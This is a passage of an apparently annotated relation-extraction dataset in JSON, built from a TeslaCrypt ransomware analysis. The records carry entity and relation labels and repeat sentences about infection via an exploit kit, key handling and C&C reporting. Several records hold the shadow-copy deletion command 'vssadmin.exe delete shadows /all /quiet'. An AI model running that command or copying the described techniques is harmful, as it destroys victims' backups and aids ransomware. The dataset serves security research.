message", "pos": [15, 17], "index": "21_0"}]], "labels": [{"r": "ST", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "RF", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "FR", "evidence": [1], "t": 1, "h": 4}, {"r": "RD", "evidence": [1], "t": 2, "h": 4}, {"r": "ST", "evidence": [1], "t": 3, "h": 4}, {"r": "RF", "evidence": [1], "t": 3, "h": 4}, {"r": "EX", "evidence": [1], "h": 1, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [1, 2, 3], "h": 1, "t": 9}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 8}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 7}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "CO", "evidence": [3], "h": 10, "t": 12}, {"r": "CO", "evidence": [3], "h": 10, "t": 11}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 13, "t": 15}, {"r": "CD", "evidence": [4], "h": 13, "t": 16}, {"r": "FR", "evidence": [4, 5], "h": 13, "t": 17}, {"r": "EX", "evidence": [4, 5], "t": 15, "h": 17}, {"r": "UK", "evidence": [5, 6], "h": 17, "t": 18}, {"r": "FR", "evidence": [5, 6, 7], "h": 17, "t": 19}, {"r": "FR", "evidence": [5, 6, 7], "h": 17, "t": 20}, {"r": "WR", "evidence": [7], "h": 19, "t": 21}]}, {"title": "663-2", "sents": [["Their", "SHA256", "SHA", "Both", "samples", "implement", "the", "following", "hashing", "algorithms", ":", "SHA", "Vector", "And", "Setup", "FunctionThis", "ransomware", "is", "usually", "distributed", "as", "an", "email", "attachment", "or", "through", "websites", "that", "redirect", "the", "victim", "to", "the", "Angler", "Exploit", "Kit", "."], ["In", "our", "analysis", ",", "the", "exploit", "kit", "delivered", "a", "malicious", "Flash", "object", "containing", "an", "exploit", "against", "CVE-2015-0311", "."], ["The", "final", "unpacked", "executable", "locates", "specific", "Windows", "directories", "such", "as", "the", "Application", "Data", "directory", ",", "and", "builds", "support", "files", "like", "the", "``", "key.dat", "''", "file", ",", "and", "files", "to", "store", "decryption", "instructions", "."], ["The", "executable", "also", "adjusts", "its", "own", "privileges", "(", "adds", "``", "SeDebugPrivilege", "''", ")", "and", "copies", "itself", "using", "a", "random", "file", "name", "to", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["A", "new", "process", "is", "then", "spawned", "and", "execution", "is", "transferred", "to", "it", "."], ["The", "original", "dropper", "file", "is", "deleted", "."], ["The", "main", "malware", "window", "is", "created", "and", "five", "threads", "are", "spawned", ",", "followed", "by", "the", "window", "message", "dispatching", "cycle", "."], ["TeslaCrypt", "threads", "perform", "the", "following", ":", "Delete", "all", "system", "Volume", "Shadow", "Copies", "by", "executing", "``", "vssadmin.exe", "delete", "shadows", "/all", "/quiet", "''", "commandOpen", "the", "``", "key.dat", "''", "file", "and", "recover", "encryption", "keys", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "ransomware", "pos": [16, 17], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [22, 22], "name": "email", "pos": [22, 23], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [26, 26], "name": "websites", "pos": [26, 27], "index": "2_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [30, 30], "name": "victim", "pos": [30, 31], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [33, 33], "name": "Angler Exploit Kit", "pos": [33, 36], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [42, 42], "name": "exploit kit", "pos": [5, 7], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [46, 46], "name": "malicious Flash", "pos": [9, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [53, 53], "name": "CVE-2015-0311", "pos": [16, 17], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [58, 58], "name": "executable", "pos": [3, 4], "index": "8_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [72, 72], "name": "support files", "pos": [17, 19], "index": "9_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [77, 77], "name": "key.dat", "pos": [22, 23], "index": "10_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [85, 85], "name": "decryption instructions", "pos": [30, 32], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [89, 89], "name": "executable", "pos": [1, 2], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [98, 98], "name": "SeDebugPrivilege", "pos": [10, 11], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [103, 103], "name": "itself", "pos": [15, 16], "index": "14_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [114, 114], "name": "Application Data directory", "pos": [26, 29], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [119, 119], "name": "new process", "pos": [1, 3], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [132, 132], "name": "original dropper", "pos": [1, 3], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [140, 140], "name": "malware window", "pos": [2, 4], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [145, 145], "name": "five threads", "pos": [7, 9], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [153, 153], "name": "window message", "pos": [15, 17], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [158, 158], "name": "TeslaCrypt threads", "pos": [0, 2], "index": "21_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [166, 166], "name": "system Volume Shadow", "pos": [8, 11], "index": "22_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [173, 173], "name": "vssadmin.exe delete shadows /all /quiet", "pos": [15, 20], "index": "23_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [182, 182], "name": "key.dat", "pos": [24, 25], "index": "24_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [187, 187], "name": "encryption keys", "pos": [29, 31], "index": "25_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 0, "h": 3}, {"r": "RD", "evidence": [0], "t": 1, "h": 3}, {"r": "ST", "evidence": [0], "t": 2, "h": 3}, {"r": "RF", "evidence": [0], "t": 2, "h": 3}, {"r": "EX", "evidence": [0], "h": 0, "t": 4}, {"r": "WR", "evidence": [0], "h": 3, "t": 4}, {"r": "FR", "evidence": [0, 1, 2], "h": 0, "t": 8}, {"r": "CO", "evidence": [0, 1], "h": 4, "t": 7}, {"r": "CO", "evidence": [0, 1], "h": 4, "t": 5}, {"r": "CO", "evidence": [0, 1], "h": 4, "t": 6}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "CO", "evidence": [2], "h": 9, "t": 11}, {"r": "CO", "evidence": [2], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 12, "t": 13}, {"r": "WR", "evidence": [3], "h": 12, "t": 14}, {"r": "CD", "evidence": [3], "h": 12, "t": 15}, {"r": "FR", "evidence": [3, 4], "h": 12, "t": 16}, {"r": "EX", "evidence": [3, 4], "t": 14, "h": 16}, {"r": "UK", "evidence": [4, 5], "h": 16, "t": 17}, {"r": "FR", "evidence": [4, 5, 6], "h": 16, "t": 18}, {"r": "FR", "evidence": [4, 5, 6], "h": 16, "t": 19}, {"r": "WR", "evidence": [6], "h": 18, "t": 20}, {"r": "CO", "evidence": [6, 7], "h": 19, "t": 21}, {"r": "UK", "evidence": [7], "h": 21, "t": 22}, {"r": "EX", "evidence": [7], "h": 21, "t": 23}, {"r": "RD", "evidence": [7], "h": 21, "t": 24}, {"r": "WR", "evidence": [7], "h": 21, "t": 24}, {"r": "WR", "evidence": [7], "h": 21, "t": 25}]}, {"title": "663-3", "sents": [["In", "our", "analysis", ",", "the", "exploit", "kit", "delivered", "a", "malicious", "Flash", "object", "containing", "an", "exploit", "against", "CVE-2015-0311", "."], ["The", "final", "unpacked", "executable", "locates", "specific", "Windows", "directories", "such", "as", "the", "Application", "Data", "directory", ",", "and", "builds", "support", "files", "like", "the", "``", "key.dat", "''", "file", ",", "and", "files", "to", "store", "decryption", "instructions", "."], ["The", "executable", "also", "adjusts", "its", "own", "privileges", "(", "adds", "``", "SeDebugPrivilege", "''", ")", "and", "copies", "itself", "using", "a", "random", "file", "name", "to", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["A", "new", "process", "is", "then", "spawned", "and", "execution", "is", "transferred", "to", "it", "."], ["The", "original", "dropper", "file", "is", "deleted", "."], ["The", "main", "malware", "window", "is", "created", "and", "five", "threads", "are", "spawned", ",", "followed", "by", "the", "window", "message", "dispatching", "cycle", "."], ["TeslaCrypt", "threads", "perform", "the", "following", ":", "Delete", "all", "system", "Volume", "Shadow", "Copies", "by", "executing", "``", "vssadmin.exe", "delete", "shadows", "/all", "/quiet", "''", "commandOpen", "the", "``", "key.dat", "''", "file", "and", "recover", "encryption", "keys", "."], ["If", "``", "key.dat", "''", "file", "doesn", "'", "t", "exist", ",", "create", "the", "keys", "and", "store", "them", "in", "an", "encrypted", "form", "in", "the", "``", "key.dat", "''", "file", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "exploit kit", "pos": [5, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "malicious Flash", "pos": [9, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [16, 16], "name": "CVE-2015-0311", "pos": [16, 17], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "executable", "pos": [3, 4], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [35, 35], "name": "support files", "pos": [17, 19], "index": "4_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [40, 40], "name": "key.dat", "pos": [22, 23], "index": "5_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [48, 48], "name": "decryption instructions", "pos": [30, 32], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [52, 52], "name": "executable", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [61, 61], "name": "SeDebugPrivilege", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [66, 66], "name": "itself", "pos": [15, 16], "index": "9_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [77, 77], "name": "Application Data directory", "pos": [26, 29], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [82, 82], "name": "new process", "pos": [1, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [95, 95], "name": "original dropper", "pos": [1, 3], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [103, 103], "name": "malware window", "pos": [2, 4], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [108, 108], "name": "five threads", "pos": [7, 9], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [116, 116], "name": "window message", "pos": [15, 17], "index": "15_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [121, 121], "name": "TeslaCrypt threads", "pos": [0, 2], "index": "16_0"}], [{"type": "SF", "sent_id": 6, "global_pos": [129, 129], "name": "system Volume Shadow", "pos": [8, 11], "index": "17_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [136, 136], "name": "vssadmin.exe delete shadows /all /quiet", "pos": [15, 20], "index": "18_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [145, 145], "name": "key.dat", "pos": [24, 25], "index": "19_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [150, 150], "name": "encryption keys", "pos": [29, 31], "index": "20_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [155, 155], "name": "key.dat", "pos": [2, 3], "index": "21_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [176, 176], "name": "key.dat", "pos": [23, 24], "index": "22_0"}]], "labels": [{"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "CO", "evidence": [1], "h": 4, "t": 6}, {"r": "CO", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 7, "t": 9}, {"r": "CD", "evidence": [2], "h": 7, "t": 10}, {"r": "FR", "evidence": [2, 3], "h": 7, "t": 11}, {"r": "EX", "evidence": [2, 3], "t": 9, "h": 11}, {"r": "UK", "evidence": [3, 4], "h": 11, "t": 12}, {"r": "FR", "evidence": [3, 4, 5], "h": 11, "t": 13}, {"r": "FR", "evidence": [3, 4, 5], "h": 11, "t": 14}, {"r": "WR", "evidence": [5], "h": 13, "t": 15}, {"r": "CO", "evidence": [5, 6], "h": 14, "t": 16}, {"r": "UK", "evidence": [6], "h": 16, "t": 17}, {"r": "EX", "evidence": [6], "h": 16, "t": 18}, {"r": "RD", "evidence": [6], "h": 16, "t": 19}, {"r": "WR", "evidence": [6], "h": 16, "t": 19}, {"r": "WR", "evidence": [6], "h": 16, "t": 20}, {"r": "CO", "evidence": [7], "h": 21, "t": 22}, {"r": "CO", "evidence": [6, 7], "t": 19, "h": 21}]}, {"title": "663-4", "sents": [["The", "final", "unpacked", "executable", "locates", "specific", "Windows", "directories", "such", "as", "the", "Application", "Data", "directory", ",", "and", "builds", "support", "files", "like", "the", "``", "key.dat", "''", "file", ",", "and", "files", "to", "store", "decryption", "instructions", "."], ["The", "executable", "also", "adjusts", "its", "own", "privileges", "(", "adds", "``", "SeDebugPrivilege", "''", ")", "and", "copies", "itself", "using", "a", "random", "file", "name", "to", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["A", "new", "process", "is", "then", "spawned", "and", "execution", "is", "transferred", "to", "it", "."], ["The", "original", "dropper", "file", "is", "deleted", "."], ["The", "main", "malware", "window", "is", "created", "and", "five", "threads", "are", "spawned", ",", "followed", "by", "the", "window", "message", "dispatching", "cycle", "."], ["TeslaCrypt", "threads", "perform", "the", "following", ":", "Delete", "all", "system", "Volume", "Shadow", "Copies", "by", "executing", "``", "vssadmin.exe", "delete", "shadows", "/all", "/quiet", "''", "commandOpen", "the", "``", "key.dat", "''", "file", "and", "recover", "encryption", "keys", "."], ["If", "``", "key.dat", "''", "file", "doesn", "'", "t", "exist", ",", "create", "the", "keys", "and", "store", "them", "in", "an", "encrypted", "form", "in", "the", "``", "key.dat", "''", "file", "."], ["Send", "the", "new", "master", "encryption", "key", "to", "the", "C", "&", "C", "server", "through", "POST", "request", "(", "the", "latest", "sample", "that", "we", "have", "analysed", "contains", "the", "following", "C", "&", "C", "server", "URLs:7tno4hib47vlep5o", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "executable", "pos": [3, 4], "index": "0_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [17, 17], "name": "support files", "pos": [17, 19], "index": "1_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [22, 22], "name": "key.dat", "pos": [22, 23], "index": "2_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [30, 30], "name": "decryption instructions", "pos": [30, 32], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [34, 34], "name": "executable", "pos": [1, 2], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "SeDebugPrivilege", "pos": [10, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [48, 48], "name": "itself", "pos": [15, 16], "index": "6_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [59, 59], "name": "Application Data directory", "pos": [26, 29], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [64, 64], "name": "new process", "pos": [1, 3], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [77, 77], "name": "original dropper", "pos": [1, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [85, 85], "name": "malware window", "pos": [2, 4], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [90, 90], "name": "five threads", "pos": [7, 9], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [98, 98], "name": "window message", "pos": [15, 17], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [103, 103], "name": "TeslaCrypt threads", "pos": [0, 2], "index": "13_0"}], [{"type": "SF", "sent_id": 5, "global_pos": [111, 111], "name": "system Volume Shadow", "pos": [8, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [118, 118], "name": "vssadmin.exe delete shadows /all /quiet", "pos": [15, 20], "index": "15_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [127, 127], "name": "key.dat", "pos": [24, 25], "index": "16_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [132, 132], "name": "encryption keys", "pos": [29, 31], "index": "17_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [137, 137], "name": "key.dat", "pos": [2, 3], "index": "18_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [158, 158], "name": "key.dat", "pos": [23, 24], "index": "19_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [166, 166], "name": "encryption key", "pos": [4, 6], "index": "20_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [170, 170], "name": "C & C", "pos": [8, 11], "index": "21_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [175, 175], "name": "POST request", "pos": [13, 15], "index": "22_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [188, 188], "name": "C & C", "pos": [26, 29], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0], "h": 1, "t": 3}, {"r": "CO", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 4, "t": 6}, {"r": "CD", "evidence": [1], "h": 4, "t": 7}, {"r": "FR", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "EX", "evidence": [1, 2], "t": 6, "h": 8}, {"r": "UK", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "FR", "evidence": [2, 3, 4], "h": 8, "t": 10}, {"r": "FR", "evidence": [2, 3, 4], "h": 8, "t": 11}, {"r": "WR", "evidence": [4], "h": 10, "t": 12}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 13}, {"r": "UK", "evidence": [5], "h": 13, "t": 14}, {"r": "EX", "evidence": [5], "h": 13, "t": 15}, {"r": "RD", "evidence": [5], "h": 13, "t": 16}, {"r": "WR", "evidence": [5], "h": 13, "t": 16}, {"r": "WR", "evidence": [5], "h": 13, "t": 17}, {"r": "FR", "evidence": [5, 6, 7], "h": 13, "t": 22}, {"r": "CO", "evidence": [6], "h": 18, "t": 19}, {"r": "CO", "evidence": [5, 6], "t": 16, "h": 18}, {"r": "RD", "evidence": [7], "t": 20, "h": 22}, {"r": "ST", "evidence": [7], "t": 21, "h": 22}, {"r": "RF", "evidence": [7], "t": 21, "h": 22}, {"r": "ST", "evidence": [7], "h": 22, "t": 23}, {"r": "RF", "evidence": [7], "h": 22, "t": 23}]}, {"title": "663-5", "sents": [["The", "executable", "also", "adjusts", "its", "own", "privileges", "(", "adds", "``", "SeDebugPrivilege", "''", ")", "and", "copies", "itself", "using", "a", "random", "file", "name", "to", "the", "user", "'", "s", "Application", "Data", "directory", "."], ["A", "new", "process", "is", "then", "spawned", "and", "execution", "is", "transferred", "to", "it", "."], ["The", "original", "dropper", "file", "is", "deleted", "."], ["The", "main", "malware", "window", "is", "created", "and", "five", "threads", "are", "spawned", ",", "followed", "by", "the", "window", "message", "dispatching", "cycle", "."], ["TeslaCrypt", "threads", "perform", "the", "following", ":", "Delete", "all", "system", "Volume", "Shadow", "Copies", "by", "executing", "``", "vssadmin.exe", "delete", "shadows", "/all", "/quiet", "''", "commandOpen", "the", "``", "key.dat", "''", "file", "and", "recover", "encryption", "keys", "."], ["If", "``", "key.dat", "''", "file", "doesn", "'", "t", "exist", ",", "create", "the", "keys", "and", "store", "them", "in", "an", "encrypted", "form", "in", "the", "``", "key.dat", "''", "file", "."], ["Send", "the", "new", "master", "encryption", "key", "to", "the", "C", "&", "C", "server", "through", "POST", "request", "(", "the", "latest", "sample", "that", "we", "have", "analysed", "contains", "the", "following", "C", "&", "C", "server", "URLs:7tno4hib47vlep5o", "."], ["79fhdm16.com7tno4hib47vlep5o.tor", "anti-tampering", "protection", ":", "every", "200", "milliseconds", ",", "TeslaCrypt", "enumerates", "all", "running", "processes", "and", "if", "a", "process", "with", "a", "filename", "that", "contains", "any", "of", "the", "words", "below", "is", "found", ",", "that", "process", "is", "terminated", "using", "the", "TerminateProcess", "Windows", "API", "cmd.exe", "Encryption", "-", "IntroductionAfter", "the", "initialization", "routine", "and", "the", "deletion", "of", "the", "Volume", "Shadow", "copies", ",", "the", "sample", "creates", "the", "``", "key.dat", "''"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "executable", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [10, 10], "name": "SeDebugPrivilege", "pos": [10, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "itself", "pos": [15, 16], "index": "2_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [26, 26], "name": "Application Data directory", "pos": [26, 29], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [31, 31], "name": "new process", "pos": [1, 3], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [44, 44], "name": "original dropper", "pos": [1, 3], "index": "5_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [52, 52], "name": "malware window", "pos": [2, 4], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [57, 57], "name": "five threads", "pos": [7, 9], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [65, 65], "name": "window message", "pos": [15, 17], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [70, 70], "name": "TeslaCrypt threads", "pos": [0, 2], "index": "9_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [78, 78], "name": "system Volume Shadow", "pos": [8, 11], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [85, 85], "name": "vssadmin.exe delete shadows /all /quiet", "pos": [15, 20], "index": "11_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [94, 94], "name": "key.dat", "pos": [24, 25], "index": "12_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [99, 99], "name": "encryption keys", "pos": [29, 31], "index": "13_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [104, 104], "name": "key.dat", "pos": [2, 3], "index": "14_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [125, 125], "name": "key.dat", "pos": [23, 24], "index": "15_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [133, 133], "name": "encryption key", "pos": [4, 6], "index": "16_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [137, 137], "name": "C & C", "pos": [8, 11], "index": "17_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [142, 142], "name": "POST request", "pos": [13, 15], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [155, 155], "name": "C & C", "pos": [26, 29], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [169, 169], "name": "TeslaCrypt", "pos": [8, 9], "index": "20_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [192, 192], "name": "process", "pos": [31, 32], "index": "21_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [197, 197], "name": "TerminateProcess Windows API", "pos": [36, 39], "index": "22_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [212, 212], "name": "Volume Shadow", "pos": [51, 53], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [217, 217], "name": "sample", "pos": [56, 57], "index": "24_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [221, 221], "name": "key.dat", "pos": [60, 61], "index": "25_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0], "h": 0, "t": 2}, {"r": "CD", "evidence": [0], "h": 0, "t": 3}, {"r": "FR", "evidence": [0, 1], "h": 0, "t": 4}, {"r": "EX", "evidence": [0, 1], "t": 2, "h": 4}, {"r": "UK", "evidence": [1, 2], "h": 4, "t": 5}, {"r": "FR", "evidence": [1, 2, 3], "h": 4, "t": 6}, {"r": "FR", "evidence": [1, 2, 3], "h": 4, "t": 7}, {"r": "WR", "evidence": [3], "h": 6, "t": 8}, {"r": "CO", "evidence": [3, 4], "h": 7, "t": 9}, {"r": "UK", "evidence": [4], "h": 9, "t": 10}, {"r": "EX", "evidence": [4], "h": 9, "t": 11}, {"r": "RD", "evidence": [4], "h": 9, "t": 12}, {"r": "WR", "evidence": [4], "h": 9, "t": 12}, {"r": "WR", "evidence": [4], "h": 9, "t": 13}, {"r": "FR", "evidence": [4, 5, 6], "h": 9, "t": 18}, {"r": "CO", "evidence": [5], "h": 14, "t": 15}, {"r": "CO", "evidence": [4, 5], "t": 12, "h": 14}, {"r": "CO", "evidence": [5, 6, 7], "h": 14, "t": 25}, {"r": "RD", "evidence": [6], "t": 16, "h": 18}, {"r": "ST", "evidence": [6], "t": 17, "h": 18}, {"r": "RF", "evidence": [6], "t": 17, "h": 18}, {"r": "ST", "evidence": [6], "h": 18, "t": 19}, {"r": "RF", "evidence": [6], "h": 18, "t": 19}, {"r": "ST", "evidence": [6, 7], "t": 19, "h": 20}, {"r": "RF", "evidence": [6, 7], "t": 19, "h": 20}, {"r": "FR", "evidence": [7], "h": 20, "t": 22}, {"r": "UK", "evidence": [7], "t": 21, "h": 22}, {"r": "RD", "evidence": [7], "h": 22, "t": 23}, {"r": "RD", "evidence": [7], "h": 22, "t": 23}, {"r": "WR", "evidence": [7], "h": 22, "t": 23}, {"r": "RD", "evidence": [7], "t": 23, "h": 24}, {"r": "RD", "evidence": [7], "t": 23, "h": 24}, {"r": "WR", "evidence": [7], "t": 23, "h": 24}, {"r": "RD", "evidence": [7], "t": 23, "h": 24}, {"r": "RD", "evidence": [7], "t": 23, "h": 24}, {"r": "WR", "evidence": [7], "t": 23, "h": 24}]}, {"title": "663-6", "sents": [["A", "new", "process", "is", "then", "spawned", "and", "execution", "is", "transferred", "to", "it", "."], ["The", "original", "dropper", "file", "is", "deleted", "."], ["The", "main", "malware", "window", "is", "created", "and", "five", "threads", "are", "spawned", ",", "followed", "by", "the", "window", "message", "dispatching", "cycle", "."], ["TeslaCrypt", "threads", "perform", "the", "following", ":", "Delete", "all", "system", "Volume", "Shadow", "Copies", "by", "executing", "``", "vssadmin.exe", "delete", "shadows", "/all", "/quiet", "''", "commandOpen", "the", "``", "key.dat", "''", "file", "and", "recover", "encryption", "keys", "."], ["If", "``", "key.dat", "''", "file", "doesn", "'", "t", "exist", ",", "create", "the", "keys", "and", "store", "them", "in", "an", "encrypted", "form", "in", "the", "``", "key.dat", "''", "file", "."], ["Send", "the", "new", "master", "encryption", "key", "to", "the", "C", "&", "C", "server", "through", "POST", "request", "(", "the", "latest", "sample", "that", "we", "have", "analysed", "contains", "the", "following", "C", "&", "C", "server", "URLs:7tno4hib47vlep5o", "."], ["79fhdm16.com7tno4hib47vlep5o.tor", "anti-tampering", "protection", ":", "every", "200", "milliseconds", ",", "TeslaCrypt", "enumerates", "all", "running", "processes", "and", "if", "a", "process", "with", "a", "filename", "that", "contains", "any", "of", "the", "words", "below", "is", "found", ",", "that", "process", "is", "terminated", "using", "the", "TerminateProcess", "Windows", "API", "cmd.exe", "Encryption", "-", "IntroductionAfter", "the", "initialization", "routine", "and", "the", "deletion", "of", "the", "Volume", "Shadow", "copies", ",", "the", "sample", "creates", "the", "``", "key.dat", "''"], ["The", "dropper", "from", "March", "2015", "calculates", "at", "least", "2", "different", "main", "keys", ":", "a", "payment", "key", "and", "a", "master", "encryption", "key", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "new process", "pos": [1, 3], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [14, 14], "name": "original dropper", "pos": [1, 3], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [22, 22], "name": "malware window", "pos": [2, 4], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [27, 27], "name": "five threads", "pos": [7, 9], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [35, 35], "name": "window message", "pos": [15, 17], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [40, 40], "name": "TeslaCrypt threads", "pos": [0, 2], "index": "5_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [48, 48], "name": "system Volume Shadow", "pos": [8, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [55, 55], "name": "vssadmin.exe delete shadows /all /quiet", "pos": [15, 20], "index": "7_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [64, 64], "name": "key.dat", "pos": [24, 25], "index": "8_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [69, 69], "name": "encryption keys", "pos": [29, 31], "index": "9_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [74, 74], "name": "key.dat", "pos": [2, 3], "index": "10_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [95, 95], "name": "key.dat", "pos": [23, 24], "index": "11_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [103, 103], "name": "encryption key", "pos": [4, 6], "index": "12_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [107, 107], "name": "C & C", "pos": [8, 11], "index": "13_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [112, 112], 